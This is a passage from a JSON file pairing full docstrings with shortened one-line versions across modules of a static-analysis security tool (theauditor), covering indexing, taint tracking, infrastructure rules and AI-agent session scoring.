    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"Strategy for building Python ORM relationship edges.\n\n    Handles:\n    - SQLAlchemy relationships (relationship(), ForeignKey)\n    - Django ORM relationships (ForeignKey, ManyToManyField)\n\n    Creates edges from ORM model variables to their relationship attributes,\n    enabling taint tracking through model relationships.\n    \"\"\"",
    "truncated": "\"\"\"Strategy for building Python ORM relationship edges.\"\"\""
  },
  {
    "file": "theauditor/graphql/builder.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"Build execution graph edges from resolvers to downstream calls.\n\n        Creates two types of edges:\n        1. 'resolver': field → resolver function (from mappings)\n        2. 'downstream_call': resolver → functions it calls\n\n        Returns:\n            Number of edges created\n        \"\"\"",
    "truncated": "\"\"\"Build execution graph edges from resolvers to downstream calls.\"\"\""
  },
  {
    "file": "theauditor/graphql/builder.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"Export GraphQL data to courier-compliant JSON artifacts.\n\n        Exports two files:\n        1. graphql_schema.json: SDL types and fields with provenance\n        2. graphql_execution.json: Resolver mappings and execution edges\n\n        Returns:\n            Tuple of (schema_path, execution_path)\n        \"\"\"",
    "truncated": "\"\"\"Export GraphQL data to courier-compliant JSON artifacts.\"\"\""
  },
  {
    "file": "theauditor/graphql/builder.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"GraphQL Builder - Correlates SDL schemas with resolver implementations.\n\nThis module implements the core correlation logic that maps:\n1. GraphQL SDL fields → Resolver functions (via symbols table)\n2. GraphQL arguments → Function parameters\n3. Field dependencies → Execution graph edges\n\nNO FALLBACKS. Hard fail if database is wrong.\n\"\"\"",
    "truncated": "\"\"\"GraphQL Builder - Correlates SDL schemas with resolver implementations.\"\"\""
  },
  {
    "file": "theauditor/graphql/visualizer.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"Generate GraphQL schema visualization.\n\n        Args:\n            output_path: Output file path\n            output_format: Format (svg, png, dot)\n            type_filter: Optional type name to filter\n\n        Note: This is a stub implementation. Full visualization requires graphviz.\n        \"\"\"",
    "truncated": "\"\"\"Generate GraphQL schema visualization.\"\"\""
  },
  {
    "file": "theauditor/indexer/config.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"Indexer configuration - constants and patterns.\n\nThis module contains all configuration values for the indexer package.\nOrganized into logical sections for maintainability.\n\nCRITICAL: This file should contain ONLY configuration constants.\nNO business logic, NO regex extraction methods.\nLanguage extractors should use AST-based extraction, not regex.\n\"\"\"",
    "truncated": "\"\"\"Indexer configuration - constants and patterns.\"\"\""
  },
  {
    "file": "theauditor/indexer/core.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"Get first n lines of a text file.\n\n    Args:\n        file_path: Path to the file\n        n: Number of lines to read\n\n    Returns:\n        List of first n lines from the file\n    \"\"\"",
    "truncated": "\"\"\"Get first n lines of a text file.\"\"\""
  },
  {
    "file": "theauditor/indexer/core.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"Process a single file and return its info.\n\n        Args:\n            file: Path to the file to process\n            exclude_file_patterns: Patterns for files to exclude\n\n        Returns:\n            File info dictionary or None if file should be skipped\n        \"\"\"",
    "truncated": "\"\"\"Process a single file and return its info.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/base_database.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"\n        Validate database schema matches expected definitions.\n\n        Runs after indexing to ensure all tables were created correctly.\n        Logs warnings for any mismatches.\n\n        Returns:\n            True if all schemas valid, False if mismatches found\n        \"\"\"",
    "truncated": "\"\"\"Validate database schema matches expected definitions.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/infrastructure_database.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"Add a Docker Compose service record to the batch.\n\n        Note: Ports, volumes, environment, capabilities, depends_on go to junction tables:\n        - compose_service_ports (via add_compose_service_port)\n        - compose_service_volumes (via add_compose_service_volume)\n        - compose_service_env (via add_compose_service_env)\n        - compose_service_capabilities (via add_compose_service_capability)\n        - compose_service_deps (via add_compose_service_dep)\n        \"\"\"",
    "truncated": "\"\"\"Add a Docker Compose service record to the batch.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/infrastructure_database.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"Add a CDK construct record to the batch.\n\n        Args:\n            file_path: Path to Python file containing construct\n            line: Line number of construct instantiation\n            cdk_class: CDK class name (e.g., 's3.Bucket', 'aws_cdk.aws_s3.Bucket')\n            construct_name: CDK logical ID (nullable - 2nd positional arg)\n            construct_id: Composite key: {file}::L{line}::{class}::{name}\n        \"\"\"",
    "truncated": "\"\"\"Add a CDK construct record to the batch.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/node_database.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"Add an import style record to the batch.\n\n        ARCHITECTURE: Normalized many-to-many relationship.\n        - Phase 1: Batch import style record (without imported_names column)\n        - Phase 2: Batch junction records for each imported name\n        - Phase 3 (post-indexing): resolved_path populated by resolve_import_paths()\n\n        NO FALLBACKS. If imported_names is malformed, hard fail.\n        \"\"\"",
    "truncated": "\"\"\"Add an import style record to the batch.\"\"\""
  },
  {
    "file": "theauditor/indexer/extractors/__init__.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"Get the appropriate extractor for a file.\n\n        Args:\n            file_path: Full file path\n            file_extension: File extension (e.g., '.py')\n\n        Returns:\n            Extractor instance or None if not supported\n        \"\"\"",
    "truncated": "\"\"\"Get the appropriate extractor for a file.\"\"\""
  },
  {
    "file": "theauditor/indexer/extractors/generic.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"Extract Docker Compose services to compose_services and junction tables.\n\n        Parses YAML inline, writes to compose_services table (17 fields)\n        and junction tables for ports, volumes, env, capabilities, deps.\n\n        Args:\n            file_path: Path to docker-compose.yml\n            content: YAML content as string\n        \"\"\"",
    "truncated": "\"\"\"Extract Docker Compose services to compose_services and junction tables.\"\"\""
  },
  {
    "file": "theauditor/indexer/extractors/graphql.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"Extract type metadata from AST node.\n\n        Args:\n            node: GraphQL type definition node\n            schema_path: File path of the schema\n\n        Returns:\n            Dict with type metadata or None if unsupported\n        \"\"\"",
    "truncated": "\"\"\"Extract type metadata from AST node.\"\"\""
  },
  {
    "file": "theauditor/indexer/extractors/javascript_resolvers.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"Resolve parent path traversals (../).\n\n    Args:\n        from_dir: Directory containing the importing file\n        import_path: Import path starting with ../\n\n    Returns:\n        Resolved base path\n    \"\"\"",
    "truncated": "\"\"\"Resolve parent path traversals (../).\"\"\""
  },
  {
    "file": "theauditor/indexer/extractors/python_deps.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"Extract dependencies from requirements.txt format.\n\n    Args:\n        content: File content\n        file_path: Path to requirements file\n\n    Returns:\n        Dict with file_path, file_type, dependencies\n    \"\"\"",
    "truncated": "\"\"\"Extract dependencies from requirements.txt format.\"\"\""
  },
  {
    "file": "theauditor/indexer/extractors/python_deps.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"Extract dependencies from pyproject.toml.\n\n    Args:\n        content: File content\n        file_path: Path to pyproject.toml\n\n    Returns:\n        Dict with file_path, file_type, dependencies, optional_dependencies\n    \"\"\"",
    "truncated": "\"\"\"Extract dependencies from pyproject.toml.\"\"\""
  },
  {
    "file": "theauditor/indexer/extractors/terraform.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"Build terraform_files table record.\n\n        Args:\n            file_path: Path to Terraform file\n            parsed: Parsed Terraform data from TerraformParser\n\n        Returns:\n            Dict with terraform_files table columns\n        \"\"\"",
    "truncated": "\"\"\"Build terraform_files table record.\"\"\""
  },
  {
    "file": "theauditor/indexer/orchestrator.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"Initialize the indexer orchestrator.\n\n        Args:\n            root_path: Project root path\n            db_path: Path to SQLite database\n            batch_size: Batch size for database operations\n            follow_symlinks: Whether to follow symbolic links\n            exclude_patterns: Patterns to exclude from indexing\n        \"\"\"",
    "truncated": "\"\"\"Initialize the indexer orchestrator.\"\"\""
  },
  {
    "file": "theauditor/indexer/orchestrator.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"Select the appropriate extractor for a file.\n\n        Args:\n            file_path: Path to the file\n            file_ext: File extension\n\n        Returns:\n            Appropriate extractor instance or None\n        \"\"\"",
    "truncated": "\"\"\"Select the appropriate extractor for a file.\"\"\""
  },
  {
    "file": "theauditor/indexer/schemas/codegen.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"Get a SHA256 hash of all schema files to detect changes.\n\n        This hash is used to verify that generated code is up-to-date\n        with the schema definitions. If schemas change but code isn't\n        regenerated, the hash mismatch will trigger auto-regeneration.\n\n        Returns:\n            SHA256 hash hex string of all schema file contents\n        \"\"\"",
    "truncated": "\"\"\"Get a SHA256 hash of all schema files to detect changes.\"\"\""
  },
  {
    "file": "theauditor/insights/graph.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"\n    Factory function to create GraphInsights instance.\n\n    Args:\n        weights: Optional custom weights for scoring\n\n    Returns:\n        GraphInsights instance\n    \"\"\"",
    "truncated": "\"\"\"Factory function to create GraphInsights instance.\"\"\""
  },
  {
    "file": "theauditor/insights/impact_analyzer.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"\n    Format impact analysis results into a human-readable report.\n\n    Args:\n        impact_data: Results from analyze_impact\n\n    Returns:\n        Formatted string report\n    \"\"\"",
    "truncated": "\"\"\"Format impact analysis results into a human-readable report.\"\"\""
  },
  {
    "file": "theauditor/insights/ml/loaders.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"Historical data loaders for ML training.\n\nLoads execution history from archived runs in .pf/history/full/*/\n- Journal stats (file touches, failures, successes)\n- RCA/FCE stats (root cause analysis failures)\n- AST proof stats (invariant checks)\n- Historical findings (past vulnerabilities)\n- Git churn (commit frequency)\n\"\"\"",
    "truncated": "\"\"\"Historical data loaders for ML training.\"\"\""
  },
  {
    "file": "theauditor/insights/semantic_context.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"Generate human-readable report from classification result.\n\n        Args:\n            result: ClassificationResult from classify_findings()\n            verbose: Include detailed findings list\n\n        Returns:\n            Formatted report string\n        \"\"\"",
    "truncated": "\"\"\"Generate human-readable report from classification result.\"\"\""
  },
  {
    "file": "theauditor/journal.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"Write an event to the journal.\n\n        Args:\n            event_type: Type of event (phase, file_touch, result, error, etc.)\n            data: Event data dictionary\n\n        Returns:\n            True if written successfully, False otherwise\n        \"\"\"",
    "truncated": "\"\"\"Write an event to the journal.\"\"\""
  },
  {
    "file": "theauditor/journal.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"Record the end of a pipeline phase.\n\n        Args:\n            phase_name: Human-readable phase name\n            success: Whether phase succeeded\n            elapsed: Execution time in seconds\n            exit_code: Process exit code\n            error_msg: Optional error message\n        \"\"\"",
    "truncated": "\"\"\"Record the end of a pipeline phase.\"\"\""
  },
  {
    "file": "theauditor/journal.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"Record a specific finding/issue.\n\n        Args:\n            file_path: File where finding was detected\n            severity: Severity level (critical, high, medium, low)\n            category: Category of finding\n            message: Finding message\n            line: Optional line number\n        \"\"\"",
    "truncated": "\"\"\"Record a specific finding/issue.\"\"\""
  },
  {
    "file": "theauditor/js_semantic_parser.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"Resolve import statements in the AST using ModuleResolver.\n\n        Args:\n            ast_data: The AST data returned by get_semantic_ast\n            current_file: Path to the current file being analyzed\n\n        Returns:\n            Dictionary mapping import statements to resolved file paths\n        \"\"\"",
    "truncated": "\"\"\"Resolve import statements in the AST using ModuleResolver.\"\"\""
  },
  {
    "file": "theauditor/module_resolver.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"Resolve an import path to its actual file location.\n\n        Args:\n            import_path: The import string (e.g., '@/utils/helpers')\n            containing_file_path: The file where the import was found\n\n        Returns:\n            The resolved path relative to project root, or the original path if no alias matches\n        \"\"\"",
    "truncated": "\"\"\"Resolve an import path to its actual file location.\"\"\""
  },
  {
    "file": "theauditor/pattern_loader.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"Load patterns from YAML files.\n\n        Args:\n            categories: Optional list of categories to load (e.g., ['runtime_issues', 'db_issues'])\n                       If None, loads all available patterns.\n\n        Returns:\n            Dictionary mapping category names to lists of patterns.\n        \"\"\"",
    "truncated": "\"\"\"Load patterns from YAML files.\"\"\""
  },
  {
    "file": "theauditor/pipelines.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"\n    Determine appropriate timeout for a command based on its name.\n\n    Args:\n        cmd: Command array to execute\n\n    Returns:\n        Timeout in seconds\n    \"\"\"",
    "truncated": "\"\"\"Determine appropriate timeout for a command based on its name.\"\"\""
  },
  {
    "file": "theauditor/planning/manager.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"Update task status.\n\n        Args:\n            task_id: ID of task to update\n            status: New status (pending|in_progress|completed|failed)\n            completed_at: Optional completion timestamp\n\n        NO FALLBACKS. Raises sqlite3.IntegrityError if task_id invalid.\n        \"\"\"",
    "truncated": "\"\"\"Update task status.\"\"\""
  },
  {
    "file": "theauditor/planning/manager.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"List tasks for a plan.\n\n        Args:\n            plan_id: ID of plan\n            status_filter: Optional status filter (pending|in_progress|completed|failed)\n\n        Returns:\n            List of task dicts\n        \"\"\"",
    "truncated": "\"\"\"List tasks for a plan.\"\"\""
  },
  {
    "file": "theauditor/planning/manager.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"Get task_id from plan_id and task_number.\n\n        Args:\n            plan_id: ID of plan\n            task_number: Task number within plan\n\n        Returns:\n            task_id or None if task not found\n        \"\"\"",
    "truncated": "\"\"\"Get task_id from plan_id and task_number.\"\"\""
  },
  {
    "file": "theauditor/planning/shadow_git.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"Retrieve file content at a specific snapshot.\n\n        Args:\n            sha: Commit SHA\n            file_path: Relative path to file\n\n        Returns:\n            bytes: File content, or None if file doesn't exist at that snapshot\n        \"\"\"",
    "truncated": "\"\"\"Retrieve file content at a specific snapshot.\"\"\""
  },
  {
    "file": "theauditor/rules/auth/password_analyze.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"Detect hardcoded passwords in source code.\n\n    Hardcoded passwords are a critical security risk as they:\n    - Cannot be rotated without code changes\n    - Are visible to anyone with code access\n    - Often leaked in version control\n\n    CWE-259: Use of Hard-coded Password\n    \"\"\"",
    "truncated": "\"\"\"Detect hardcoded passwords in source code.\"\"\""
  },
  {
    "file": "theauditor/rules/auth/password_analyze.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"Detect lack of password complexity enforcement.\n\n    Strong passwords should enforce:\n    - Minimum length (12+ characters)\n    - Character diversity (upper, lower, numbers, symbols)\n    - No common passwords\n\n    CWE-521: Weak Password Requirements\n    \"\"\"",
    "truncated": "\"\"\"Detect lack of password complexity enforcement.\"\"\""
  },
  {
    "file": "theauditor/rules/base.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"Extract code snippet around a line number.\n\n        Args:\n            line_num: 1-based line number\n            context_lines: Lines before/after to include\n\n        Returns:\n            Code snippet with line numbers\n        \"\"\"",
    "truncated": "\"\"\"Extract code snippet around a line number.\"\"\""
  },
  {
    "file": "theauditor/rules/common/util.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"Decode Base64 and verify if content is secret-like.\n\n        Args:\n            value: String that matches Base64 pattern\n\n        Returns:\n            True if valid Base64 encoding of secret-like content,\n            False if false positive (sequential, low entropy, etc.)\n        \"\"\"",
    "truncated": "\"\"\"Decode Base64 and verify if content is secret-like.\"\"\""
  },
  {
    "file": "theauditor/rules/dependency/unused_dependencies.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"Find declared dependencies that are never imported.\n\n    Args:\n        declared_deps: Dict of package -> (file, is_dev, is_peer)\n        imported: Set of imported package names\n\n    Returns:\n        List of findings for unused dependencies\n    \"\"\"",
    "truncated": "\"\"\"Find declared dependencies that are never imported.\"\"\""
  },
  {
    "file": "theauditor/rules/deployment/aws_cdk_encryption_analyze.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"AWS CDK Encryption Detection - database-first rule.\n\nDetects unencrypted storage resources in CDK Python code.\n\nChecks:\n- RDS DatabaseInstance without storage_encrypted\n- EBS Volume without encrypted\n- DynamoDB Table with default encryption (not customer-managed)\n\"\"\"",
    "truncated": "\"\"\"AWS CDK Encryption Detection - database-first rule.\"\"\""
  },
  {
    "file": "theauditor/rules/deployment/aws_cdk_iam_wildcards_analyze.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"AWS CDK IAM Wildcard Detection - database-first rule.\n\nDetects IAM policies with overly permissive wildcard actions or resources in CDK Python code.\n\nChecks:\n- IAM policies with actions containing '*' (HIGH)\n- IAM policies with resources containing '*' (HIGH)\n- IAM roles with AdministratorAccess policy attached (CRITICAL)\n\"\"\"",
    "truncated": "\"\"\"AWS CDK IAM Wildcard Detection - database-first rule.\"\"\""
  },
  {
    "file": "theauditor/rules/deployment/aws_cdk_sg_open_analyze.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"AWS CDK Security Group Detection - database-first rule.\n\nDetects security groups with overly permissive ingress/egress rules in CDK Python code.\n\nChecks:\n- Ingress rules from 0.0.0.0/0 (CRITICAL)\n- Ingress rules from ::/0 IPv6 (CRITICAL)\n- allow_all_outbound=True (LOW - informational)\n\"\"\"",
    "truncated": "\"\"\"AWS CDK Security Group Detection - database-first rule.\"\"\""
  },
  {
    "file": "theauditor/rules/github_actions/artifact_poisoning.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"Check if job performs dangerous operations on downloaded artifacts.\n\n    Args:\n        job_id: Job identifier\n        cursor: Database cursor\n\n    Returns:\n        List of dangerous operation types found\n    \"\"\"",
    "truncated": "\"\"\"Check if job performs dangerous operations on downloaded artifacts.\"\"\""
  },
  {
    "file": "theauditor/rules/node/async_concurrency_analyze.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"Golden Standard JavaScript/TypeScript Async and Concurrency Analyzer.\n\nDetects race conditions, async issues, and concurrency problems via database analysis.\nDemonstrates database-aware rule pattern using finite pattern matching.\n\nMIGRATION STATUS: Golden Standard Implementation [2024-12-29]\nSignature: context: StandardRuleContext -> List[StandardFinding]\nSchema Contract Compliance: v1.1+ (Fail-Fast, Uses build_query())\n\"\"\"",
    "truncated": "\"\"\"Golden Standard JavaScript/TypeScript Async and Concurrency Analyzer.\"\"\""
  },
  {
    "file": "theauditor/rules/node/runtime_issue_analyze.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"Golden Standard Node.js Runtime Security Analyzer.\n\nDetects runtime security vulnerabilities in JavaScript/TypeScript via database analysis.\nDemonstrates database-aware rule pattern using finite pattern matching.\n\nMIGRATION STATUS: Golden Standard Implementation [2024-12-29]\nSignature: context: StandardRuleContext -> List[StandardFinding]\nSchema Contract Compliance: v1.1+ (Fail-Fast, Uses build_query())\n\"\"\"",
    "truncated": "\"\"\"Golden Standard Node.js Runtime Security Analyzer.\"\"\""
  },
  {
    "file": "theauditor/rules/orchestrator.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"Check if a rule should run on a specific file based on its METADATA.\n\n        Args:\n            rule_module: The imported rule module\n            file_path: Path to the file being analyzed\n\n        Returns:\n            True if rule should run on this file, False otherwise\n        \"\"\"",
    "truncated": "\"\"\"Check if a rule should run on a specific file based on its METADATA.\"\"\""
  },
  {
    "file": "theauditor/rules/orchestrator.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"Build keyword arguments for a rule based on its requirements.\n\n        Args:\n            rule: RuleInfo object\n            context: RuleContext with available data\n\n        Returns:\n            Dictionary of keyword arguments for the rule\n        \"\"\"",
    "truncated": "\"\"\"Build keyword arguments for a rule based on its requirements.\"\"\""
  },
  {
    "file": "theauditor/rules/orchestrator.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"Check if variable is in any taint path.\n\n            Args:\n                var_name: Name of the variable to check\n                line: Line number where the check is happening\n\n            Returns:\n                True if the variable is tainted, False otherwise\n            \"\"\"",
    "truncated": "\"\"\"Check if variable is in any taint path.\"\"\""
  },
  {
    "file": "theauditor/rules/orchestrator.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"Run all rules for a project.\n\n    Args:\n        project_path: Root path of the project\n        db_path: Optional database path (defaults to .pf/repo_index.db)\n\n    Returns:\n        List of all findings\n    \"\"\"",
    "truncated": "\"\"\"Run all rules for a project.\"\"\""
  },
  {
    "file": "theauditor/rules/python/async_concurrency_analyze.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"Validate columns exist in table schema.\n\n        Args:\n            table_name: Table to check\n            columns: List of column names to validate\n\n        Raises:\n            ValueError: If table or column doesn't exist\n        \"\"\"",
    "truncated": "\"\"\"Validate columns exist in table schema.\"\"\""
  },
  {
    "file": "theauditor/rules/xss/react_xss_analyze.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"Check for dangerouslySetInnerHTML with user input.\n\n    Modernization (2025-11-22):\n    - Fixed N+1 query: Single JOIN instead of loop + query per component\n    - Fixed blind spot: Removed LIMIT 10 that missed vulnerabilities beyond first 10 lines\n    - Fixed scope: Added end_line boundary to prevent spanning multiple components\n    - Memory safe: Stream results with cursor iteration instead of fetchall()\n    - Performance: Filter for dangerouslySetInnerHTML in SQL to reduce data transfer\n    \"\"\"",
    "truncated": "\"\"\"Check for dangerouslySetInnerHTML with user input.\"\"\""
  },
  {
    "file": "theauditor/session/analysis.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"SessionAnalysis - Orchestrate complete session analysis pipeline.\n\nThis module orchestrates the 3-layer analysis:\n1. Layer 1 (Execution Capture): Parse session logs, extract diffs\n2. Layer 2 (Deterministic Scoring): Run diffs through SAST pipeline\n3. Layer 3 (Workflow Correlation): Check planning.md compliance\n\nStores results to session_executions table via SessionExecutionStore.\n\"\"\"",
    "truncated": "\"\"\"SessionAnalysis - Orchestrate complete session analysis pipeline.\"\"\""
  },
  {
    "file": "theauditor/session/detector.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"\n    Detect what type of AI agent created the sessions by inspecting .jsonl format.\n\n    Args:\n        session_dir: Directory containing session .jsonl files\n\n    Returns:\n        'claude-code', 'codex', or 'unknown'\n    \"\"\"",
    "truncated": "\"\"\"Detect what type of AI agent created the sessions by inspecting .jsonl format.\"\"\""
  },
  {
    "file": "theauditor/session/diff_scorer.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"Score a single diff from Edit/Write tool call.\n\n        Args:\n            tool_call: ToolCall object with diff information\n            files_read: Set of files read before this tool call (for blind edit detection)\n\n        Returns:\n            DiffScore object or None if scoring failed\n        \"\"\"",
    "truncated": "\"\"\"Score a single diff from Edit/Write tool call.\"\"\""
  },
  {
    "file": "theauditor/session/diff_scorer.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"Write diff to temporary file for analysis.\n\n        Args:\n            file_path: Original file path (for extension)\n            new_code: New code content\n\n        Returns:\n            Path to temp file or None if failed\n        \"\"\"",
    "truncated": "\"\"\"Write diff to temporary file for analysis.\"\"\""
  },
  {
    "file": "theauditor/session/diff_scorer.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"Run pattern detection on diff (simplified version).\n\n        Args:\n            temp_file: Path to temp file with code\n            new_code: New code content\n\n        Returns:\n            Pattern risk score (0.0-1.0)\n        \"\"\"",
    "truncated": "\"\"\"Run pattern detection on diff (simplified version).\"\"\""
  },
  {
    "file": "theauditor/session/workflow_checker.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"WorkflowChecker - Validate agent execution against planning.md workflows.\n\nThis module checks if agent execution follows defined workflows:\n- Did agent run `aud blueprint` first? (MANDATORY)\n- Did agent use `aud query` before editing? (MANDATORY)\n- Did agent read files before editing? (no blind edits)\n\nReturns compliance score and list of violations.\n\"\"\"",
    "truncated": "\"\"\"WorkflowChecker - Validate agent execution against planning.md workflows.\"\"\""
  },
  {
    "file": "theauditor/taint/core.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"Check if a function is a registered sanitizer.\n\n        Args:\n            function_name: Function name to check\n            language: Optional language to check (also checks global sanitizers)\n\n        Returns:\n            True if function is a registered sanitizer\n        \"\"\"",
    "truncated": "\"\"\"Check if a function is a registered sanitizer.\"\"\""
  },
  {
    "file": "theauditor/taint/core.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"Load source/sink patterns from framework_taint_patterns table.\n\n        Schema:\n            framework_taint_patterns(id, framework_id, pattern, pattern_type, category)\n            frameworks(id, name, version, language, path, source, package_manager, is_primary)\n\n        This is the Database-First architecture fix: patterns are seeded during\n        indexing and loaded here at analysis time.\n        \"\"\"",
    "truncated": "\"\"\"Load source/sink patterns from framework_taint_patterns table.\"\"\""
  },
  {
    "file": "theauditor/taint/discovery.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"\n        Assess the risk level of an SQL query based on its construction.\n\n        Args:\n            query_text: The SQL query text\n\n        Returns:\n            Risk level: 'critical', 'high', 'medium', or 'low'\n        \"\"\"",
    "truncated": "\"\"\"Assess the risk level of an SQL query based on its construction.\"\"\""
  },
  {
    "file": "theauditor/taint/flow_resolver.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"Get the edge type between two nodes from in-memory cache (O(1) lookup).\n\n        Args:\n            from_node: Source node ID (format: file::function::variable)\n            to_node: Target node ID (format: file::function::variable)\n\n        Returns:\n            Edge type (assignment/return/parameter_binding/cross_boundary/etc)\n        \"\"\"",
    "truncated": "\"\"\"Get the edge type between two nodes from in-memory cache (O(1) lookup).\"\"\""
  },
  {
    "file": "theauditor/taint/ifds_analyzer.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"Initialize IFDS analyzer with database connections.\n\n        Args:\n            repo_db_path: Path to repo_index.db (CFG, symbols, assignments)\n            graph_db_path: Path to graphs.db (DFG, call graph)\n            cache: Optional memory cache for performance\n            registry: Optional TaintRegistry for sanitizer checking\n            type_resolver: Optional TypeResolver for ORM aliasing and controller detection\n        \"\"\"",
    "truncated": "\"\"\"Initialize IFDS analyzer with database connections.\"\"\""
  },
  {
    "file": "theauditor/taint/ifds_analyzer.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"Get function containing a line.\n\n        Args:\n            file: File path\n            line: Line number\n\n        Returns:\n            Function name or \"global\"\n        \"\"\"",
    "truncated": "\"\"\"Get function containing a line.\"\"\""
  },
  {
    "file": "theauditor/terraform/graph.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"Find which property path contains the variable reference.\n\n        Args:\n            properties: Resource properties dict\n            var_name: Variable name to search for\n\n        Returns:\n            Property key or None if not found\n        \"\"\"",
    "truncated": "\"\"\"Find which property path contains the variable reference.\"\"\""
  },
  {
    "file": "theauditor/terraform/graph.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"Get resource properties from junction table.\n\n        Args:\n            cursor: Database cursor\n            resource_id: Resource ID to look up\n\n        Returns:\n            Dict of property_name -> property_value\n        \"\"\"",
    "truncated": "\"\"\"Get resource properties from junction table.\"\"\""
  },
  {
    "file": "theauditor/terraform/graph.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"Get resource dependencies from junction table.\n\n        Args:\n            cursor: Database cursor\n            resource_id: Resource ID to look up\n\n        Returns:\n            List of dependency references\n        \"\"\"",
    "truncated": "\"\"\"Get resource dependencies from junction table.\"\"\""
  },
  {
    "file": "theauditor/tools.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"\n    Detect all tool versions and write reports.\n\n    Writes:\n    - {out_dir}/TOOLS.md - Human-readable markdown\n    - {out_dir}/tools.json - Machine-readable JSON\n\n    Returns the tools dictionary.\n    \"\"\"",
    "truncated": "\"\"\"Detect all tool versions and write reports.\"\"\""
  },
  {
    "file": "theauditor/universal_detector.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"Initialize detector.\n\n        Args:\n            project_path: Root path of project to analyze\n            pattern_loader: Optional PatternLoader for non-AST files\n            with_ast: Enable AST-based detection (compatibility flag)\n            with_frameworks: Enable framework detection (compatibility flag)\n            exclude_patterns: Patterns to exclude from scanning\n        \"\"\"",
    "truncated": "\"\"\"Initialize detector.\"\"\""
  },
  {
    "file": "theauditor/universal_detector.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"Run pattern detection across project.\n\n        Args:\n            categories: Optional categories to filter patterns\n            file_filter: Optional glob pattern to filter files\n\n        Returns:\n            List of all findings\n        \"\"\"",
    "truncated": "\"\"\"Run pattern detection across project.\"\"\""
  },
  {
    "file": "theauditor/universal_detector.py",
    "line": -1,
    "original_lines": 9,
    "original": "\"\"\"Targeted pattern detection for specific files.\n\n        Args:\n            file_list: List of files to analyze\n            categories: Optional categories to filter patterns\n\n        Returns:\n            List of findings for specified files\n        \"\"\"",
    "truncated": "\"\"\"Targeted pattern detection for specific files.\"\"\""
  },
  {
    "file": "theauditor/utils/code_snippets.py",
    "line": -1,
    "original_lines": 9,
